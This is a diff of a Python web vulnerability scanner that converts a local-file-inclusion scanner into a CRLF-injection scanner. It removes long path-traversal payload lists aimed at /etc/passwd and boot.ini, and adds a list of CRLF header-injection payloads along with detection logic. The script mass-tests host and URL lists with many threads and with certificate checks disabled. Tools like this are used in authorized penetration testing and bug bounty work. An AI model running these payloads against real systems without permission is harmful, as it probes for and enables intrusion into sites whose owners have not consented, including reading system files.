@@ -28,16 +28,20 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 def banner():
 	print("""
-                        | |  / _| (_)      _ __    _   _
-                        | | | |_  | |     | '_ \  | | | |
-                        | | |  _| | |  _  | |_) | | |_| |
-                        |_| |_|   |_| (_) | .__/   \__, |
-                                          |_|      |___/
+                                 _  __
+                        ___ _ __| |/ _|      _ __  _   _
+                       / __| '__| | |_      | '_ \| | | |
+                      | (__| |  | |  _|  _  | |_) | |_| |
+                       \___|_|  |_|_|   (_) | .__/ \__, |
+                                            |_|    |___/
 
-                    by @gwendallecoguic
+                                by @gwendallecoguic
 
 """)
 	pass
+
+banner()
+
 
 
 def rebuiltQuery( t_params ):
@@ -71,11 +75,9 @@ def testParams( t_urlparse, payload ):
         for k in range(len(t_values)):
             pvalue = t_values[k]
             t_params2 = copy.deepcopy(t_params)
-            # if pvalue == '':
-            #     pvalue = 666
-            # it's replacement mode, not concat
-            new_value = payload
-            # new_value = str(pvalue) + payload
+            if pvalue == '':
+                pvalue = 666
+            new_value = str(pvalue) + payload
             # t_params2[pname][k] = urllib.parse.quote( new_value )
             t_params2[pname][k] = new_value
             new_query = rebuiltQuery( t_params2 )
@@ -119,10 +121,10 @@ def testPayload( url, payload ):
     if len(t_urlparse.query):
         testParams( t_urlparse, payload.strip('/') )
 
-    # if len(t_urlparse.fragment):
-    #     testFragment( t_urlparse, payload.strip('/') )
+    if len(t_urlparse.fragment):
+        testFragment( t_urlparse, payload.strip('/') )
 
-    # testPath( t_urlparse, payload )
+    testPath( t_urlparse, payload )
 
 
 def testURL( url ):
@@ -144,6 +146,7 @@ def doTest( url, method='GET', post_params='' ):
     return
 
 
+# console.log( 'Usage: phantomjs xss.js <method> <url> [<post_params>] [<cookies> <domain>]');
 def realDoTest( t_params ):
 
     url = t_params[0]
@@ -160,14 +163,14 @@ def realDoTest( t_params ):
     if not u in t_exceptions:
         t_exceptions[u] = 0
     if t_exceptions[u] >= MAX_EXCEPTION:
-        if _verbose >= 3 and _verbose < 4:
+        if _verbose >= 3:
             print("skip too many exceptions %s" % t_urlparse.netloc)
         return
 
     if not u in t_vulnerable:
         t_vulnerable[u] = 0
     if t_vulnerable[u] >= MAX_VULNERABLE:
-        if _verbose >= 3 and _verbose < 4:
+        if _verbose >= 3:
             print("skip already vulnerable %s" % t_urlparse.netloc)
         return
 
@@ -175,10 +178,10 @@ def realDoTest( t_params ):
         if method == 'POST':
             r = requests.post( url, data=post_params, headers=t_custom_headers, timeout=5, verify=False )
         else:
-            r = requests.get( url, headers=t_custom_headers, timeout=5, verify=False )
+            r = requests.head( url, headers=t_custom_headers, timeout=5, verify=False )
     except Exception as e:
         t_exceptions[u] = t_exceptions[u] + 1
-        if _verbose >= 3 and _verbose < 4:
+        if _verbose >= 3:
             sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
         return
 
@@ -187,7 +190,8 @@ def realDoTest( t_params ):
     else:
         content_type = '-'
 
-    if 'root:x:' in r.text or '[boot loader]' in r.text:
+    t_headers = list( map( str.lower,r.headers.keys() ) )
+    if 'xcrlf' in t_headers:
         vuln = 'VULNERABLE'
     else:
         vuln = '-'
@@ -199,15 +203,71 @@ def realDoTest( t_params ):
     output = '%s\t\tC=%d\t\tT=%s\t\tV=%s\n' %  (url,r.status_code,content_type,vuln)
 
     fp = open( t_multiproc['f_output'], 'a+' )
-    # fp = f_output
     fp.write( output )
     fp.close()
 
-    if vuln == 'VULNERABLE' or (_verbose >= 2 and _verbose < 4):
+    if _verbose >= 2 or (_verbose >= 1 and vuln == 'VULNERABLE'):
         if vuln == 'VULNERABLE':
             sys.stdout.write( '%s%s%s' % (fg('light_red'),output,attr(0)) )
         else:
             sys.stdout.write( output )
+
+
+# old version
+# def testURL( url ):
+#     time.sleep( 0.01 )
+
+#     if _verbose <= 1:
+#         sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
+#         t_multiproc['n_current'] = t_multiproc['n_current'] + 1
+
+#     t_urlparse = urlparse(url)
+#     u = t_urlparse.scheme + '_' + t_urlparse.netloc
+
+#     if not u in t_exceptions:
+#         t_exceptions[u] = 0
+#     if t_exceptions[u] >= MAX_EXCEPTION:
+#         if _verbose >= 3:
+#             print("skip too many exceptions %s" % t_urlparse.netloc)
+#         return
+
+#     if not u in t_vulnerable:
+#         t_vulnerable[u] = 0
+#     if t_vulnerable[u] >= MAX_VULNERABLE:
+#         if _verbose >= 3:
+#             print("skip already vulnerable %s" % t_urlparse.netloc)
+#         return
+
+#     try:
+#         r = requests.head( url, timeout=5, verify=False )
+#     except Exception as e:
+#         t_exceptions[u] = t_exceptions[u] + 1
+#         if _verbose >= 3:
+#             sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
+#         return
+
+#     if 'Content-Type' in r.headers:
+#         content_type = r.headers['Content-Type']
+#     else:
+#         content_type = '-'
+
+#     t_headers = list( map( str.lower,r.headers.keys() ) )
+#     if 'xcrlf' in t_headers:
+#         vuln = 'VULNERABLE'
+#     else:
+#         vuln = '-'
+
+#     if vuln == 'VULNERABLE':
+#         t_vulnerable[u] = t_vulnerable[u] + 1
+
+#     output = '%sC=%d\t\tT=%s\t\tV=%s\n' %  (url.ljust(t_multiproc['u_max_length']),r.status_code,content_type,vuln)
+
+#     fp = open( t_multiproc['f_output'], 'a+' )
+#     fp.write( output )
+#     fp.close()
+
+#     if _verbose >= 2 or (_verbose >= 1 and vuln == 'VULNERABLE'):
+#         sys.stdout.write( '%s' % output )
 
 
 parser = argparse.ArgumentParser()
@@ -215,24 +275,14 @@ parser.add_argument( "-a","--path",help="set paths list" )
 parser.add_argument( "-d","--header",help="custom headers, example: cookie1=value1;cookie2=value2...", action="append" )
 parser.add_argument( "-p","--payloads",help="set payloads list" )
 parser.add_argument( "-o","--hosts",help="set host list (required or -u)" )
+parser.add_argument( "-O","--output",help="output file location " )
 # parser.add_argument( "-r","--redirect",help="follow redirection" )
 parser.add_argument( "-s","--scheme",help="scheme to use, default=http,https" )
-parser.add_argument( "-O","--output",help="output file location " )
 parser.add_argument( "-t","--threads",help="threads, default 10" )
 parser.add_argument( "-u","--urls",help="set url list (required or -o)" )
-parser.add_argument( "-w","--windows",help="only windows payloads", action="store_true" )
-parser.add_argument( "-wl","--winux",help="windows and linux payloads", action="store_true" )
-parser.add_argument( "-v","--verbose",help="display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=full debug, 4=only vulnerable,no extra text like banner, default: 1" )
+parser.add_argument( "-v","--verbose",help="display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=full debug, default: 1" )
 parser.parse_args()
 args = parser.parse_args()
-
-if args.verbose:
-    _verbose = int(args.verbose)
-else:
-    _verbose = 1
-
-if _verbose < 4:
-    banner()
 
 if args.scheme:
     t_scheme = args.scheme.split(',')
@@ -255,8 +305,7 @@ if args.hosts:
     else:
         t_hosts.append( args.hosts )
 n_hosts = len(t_hosts)
-if _verbose < 4:
-    sys.stdout.write( '%s[+] %d hosts found: %s%s\n' % (fg('green'),n_hosts,args.hosts,attr(0)) )
+sys.stdout.write( '%s[+] %d hosts found: %s%s\n' % (fg('green'),n_hosts,args.hosts,attr(0)) )
 
 t_urls = []
 if args.urls:
@@ -267,25 +316,10 @@ if args.urls:
     else:
         t_urls.append( args.urls )
 n_urls = len(t_urls)
-if _verbose < 4:
-    sys.stdout.write( '%s[+] %d urls found: %s%s\n' % (fg('green'),n_urls,args.urls,attr(0)) )
+sys.stdout.write( '%s[+] %d urls found: %s%s\n' % (fg('green'),n_urls,args.urls,attr(0)) )
 
 if n_hosts == 0 and n_urls == 0:
     parser.error( 'hosts/urls list missing' )
-
-if args.payloads:
-    t_payloads = []
-    if os.path.isfile(args.payloads):
-        fp = open( args.payloads, 'r' )
-        t_payloads = fp.read().strip().split("\n")
-        fp.close()
-    else:
-        t_payloads.append( args.payloads )
-    n_payloads = len(t_payloads)
-    if _verbose < 4:
-        sys.stdout.write( '%s[+] %d payloads found: %s%s\n' % (fg('green'),n_payloads,args.payloads,attr(0)) )
-else:
-    n_payloads = 0
 
 t_path = [ '' ]
 if args.path:
@@ -298,6 +332,24 @@ if args.path:
 n_path = len(t_path)
 sys.stdout.write( '%s[+] %d path found: %s%s\n' % (fg('green'),n_path,args.path,attr(0)) )
 
+if args.payloads:
+    t_payloads = []
+    if os.path.isfile(args.payloads):
+        fp = open( args.payloads, 'r' )
+        t_payloads = fp.read().strip().split("\n")
+        fp.close()
+    else:
+        t_payloads.append( args.payloads )
+    n_payloads = len(t_payloads)
+    sys.stdout.write( '%s[+] %d payloads found: %s%s\n' % (fg('green'),n_payloads,args.payloads,attr(0)) )
+else:
+    n_payloads = 0
+
+if args.verbose:
+    _verbose = int(args.verbose)
+else:
+    _verbose = 1
+
 if args.threads:
     _threads = int(args.threads)
 else:
@@ -305,7 +357,7 @@ else:
 
 t_totest = []
 u_max_length = 0
-# d_output =  os.getcwd()+'/lfi'
+# d_output =  os.getcwd()+'/crlf'
 f_output = args.output
 # if not os.path.isdir(d_output):
 #     try:
@@ -314,127 +366,36 @@ f_output = args.output
 #         sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
 #         exit()
 
-if _verbose < 4:
-    sys.stdout.write( '%s[+] options are -> threads:%d, verbose:%d%s\n' % (fg('green'),_threads,_verbose,attr(0)) )
-    sys.stdout.write( '[+] computing host and payload list...\n' )
+sys.stdout.write( '%s[+] options are -> threads:%d, verbose:%d%s\n' % (fg('green'),_threads,_verbose,attr(0)) )
+sys.stdout.write( '[+] computing host and payload list...\n' )
 
 
-# source: https://github.com/jhaddix/SecLists/blob/master/Fuzzing/LFI-JHADDIX.txt
-t_payloads_linux = [
-    '%00../../../../../../etc/passwd',
-    '%00/etc/passwd%00',
-    '%0a/bin/cat%20/etc/passwd',
-    '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd',
-    '\\&apos;/bin/cat%20/etc/passwd\\&apos;',
-    '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
-    '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd',
-    '/etc/default/passwd',
-    '/etc/master.passwd',
-    '/./././././././././././etc/passwd',
-    '/../../../../../../../../../../etc/passwd',
-    '/../../../../../../../../../../etc/passwd^^',
-    '/..\../..\../..\../..\../..\../..\../etc/passwd',
-    '/etc/passwd',
-    'file:///etc/passwd',
-    '../../../../../../../../../../../../../../../../../../../../../../etc/passwd',
-    '...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//etc/passwd',
-    '..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././etc/passwd',
-    '..\..\..\..\..\..\..\..\..\..\etc\passwd',
-    '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd',
-    '\..\..\..\..\..\..\..\..\..\..\etc\passwd',
-    'etc/passwd',
-    '/etc/passwd%00',
-    '../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00',
-    '..\..\..\..\..\..\..\..\..\..\etc\passwd%00',
-    '\..\..\..\..\..\..\..\..\..\..\etc\passwd%00',
-    '/../../../../../../../../../../../etc/passwd%00.html',
-    '/../../../../../../../../../../../etc/passwd%00.jpg',
-    '../../../../../../etc/passwd&=%3C%3C%3C%3C',
-    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd',
-    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00',
-    '💩../../../../../../etc/passwd',
-    '💩/etc/passwd💩',
-    '/etc/passwd💩',
-    '../../../../../../../../../../../../../../../../../../../../../../etc/passwd💩',
-    '..\..\..\..\..\..\..\..\..\..\etc\passwd💩',
-    '\..\..\..\..\..\..\..\..\..\..\etc\passwd💩',
-    '/../../../../../../../../../../../etc/passwd💩.html',
-    '/../../../../../../../../../../../etc/passwd💩.jpg',
-    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd💩',
-    '#../../../../../../etc/passwd',
-    '#/etc/passwd#',
-    '/etc/passwd#',
-    '../../../../../../../../../../../../../../../../../../../../../../etc/passwd#',
-    '..\..\..\..\..\..\..\..\..\..\etc\passwd#',
-    '\..\..\..\..\..\..\..\..\..\..\etc\passwd#',
-    '/../../../../../../../../../../../etc/passwd#.html',
-    '/../../../../../../../../../../../etc/passwd#.jpg',
-    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd#'
-]
-t_payloads_windows = [
-    'C:/boot.ini',
-    'C:\boot.ini',
-    '%00../../../../../../boot.ini',
-    '%00/boot.ini%00',
-    '%0a/bin/cat%20/boot.ini',
-    '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2%2Fboot.ini',
-    '..%2F..%2F..%2F%2F..%2F..%2/boot.ini',
-    '\\&apos;/bin/cat%20/boot.ini\\&apos;',
-    '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini',
-    '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini',
-    '/default/boot.ini',
-    '/master.boot.ini',
-    '/./././././././././././boot.ini',
-    '/../../../../../../../../../../boot.ini',
-    '/../../../../../../../../../../boot.ini^^',
-    '/..\../..\../..\../..\../..\../..\../boot.ini',
-    '/boot.ini',
-    'file:///boot.ini',
-    '../../../../../../../../../../../../../../../../../../../../../../boot.ini',
-    '...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//...//boot.ini',
-    '..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././boot.ini',
-    '..\..\..\..\..\..\..\..\..\..\boot.ini',
-    '.\\./.\\./.\\./.\\./.\\./.\\./boot.ini',
-    '\..\..\..\..\..\..\..\..\..\..\boot.ini',
-    'boot.ini',
-    '/boot.ini%00',
-    '../../../../../../../../../../../../../../../../../../../../../../boot.ini%00',
-    '..\..\..\..\..\..\..\..\..\..\boot.ini%00',
-    '\..\..\..\..\..\..\..\..\..\..\boot.ini%00',
-    '/../../../../../../../../../../../boot.ini%00.html',
-    '/../../../../../../../../../../../boot.ini%00.jpg',
-    '../../../../../../boot.ini&=%3C%3C%3C%3C',
-    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..22fboot.ini',
-    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..22fboot.ini%00',
-    '💩../../../../../../boot.ini',
-    '💩/boot.ini💩',
-    '/boot.ini💩',
-    '../../../../../../../../../../../../../../../../../../../../../../boot.ini💩',
-    '..\..\..\..\..\..\..\..\..\..\boot.ini💩',
-    '\..\..\..\..\..\..\..\..\..\..\boot.ini💩',
-    '/../../../../../../../../../../../boot.ini💩.html',
-    '/../../../../../../../../../../../boot.ini💩.jpg',
-    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..22fboot.ini💩',
-    '#../../../../../../boot.ini',
-    '#/boot.ini#',
-    '/boot.ini#',
-    '../../../../../../../../../../../../../../../../../../../../../../boot.ini#',
-    '..\..\..\..\..\..\..\..\..\..\boot.ini#',
-    '\..\..\..\..\..\..\..\..\..\..\boot.ini#',
-    '/../../../../../../../../../../../boot.ini#.html',
-    '/../../../../../../../../../../../boot.ini#.jpg',
-    '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..22fboot.ini#',
-]
-
+# source: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
 if not n_payloads:
-    t_payloads = t_payloads_linux
-    if args.windows:
-        t_payloads = t_payloads_windows
-    elif args.winux:
-        t_payloads = t_payloads + t_payloads_windows
+    t_payloads = [
+        '/%0dXcrlf%3a1',
+        '/%0aXcrlf%3a1',
+        '/%0d%0aXcrlf%3a1',
+        '/?%0dXcrlf%3acrlf=1',
+        '/%3F%0aXcrlf%3acrlf=1',
+        '/%0aXcrlf%3a1/..',
+        '/%23%0dXcrlf:1',
+        '/%23%0aXcrlf:1',
+        '/%23%0d%0aXcrlf:1',
+        '/xxx%0dXcrlf:1',
+        '/xxx%0aXcrlf:1',
+        '/xxx%0d%0aXcrlf:1',
+        '//xxx%0dXcrlf:1;',
+        '//xxx%0aXcrlf:1;',
+        '//xxx%0d%0aXcrlf:1;',
+        '/xxx/x%23%0dXcrlf:1',
+        '/xxx/x%3F%0dXcrlf:1',
+        '/v1/xx%20xx%0d%0aXcrlf:1',
+        '/api/v1/see%20below%0d%0aXcrlf:1',
+        '/%E5%98%8a%E5%98%8dXcrlf:1',
+        '/~bin/%0d%0aXcrlf:1',
+    ]
+
 
 for scheme in t_scheme:
     for host in t_hosts:
@@ -509,7 +470,6 @@ try:
     q.join()
 except KeyboardInterrupt:
     sys.exit(1)
-
 
 if _verbose < 4:
     sys.stdout.write( '%s[+] %d urls payloaded to test.%s\n' % (fg('green'),len(t_realdotest),attr(0)) )
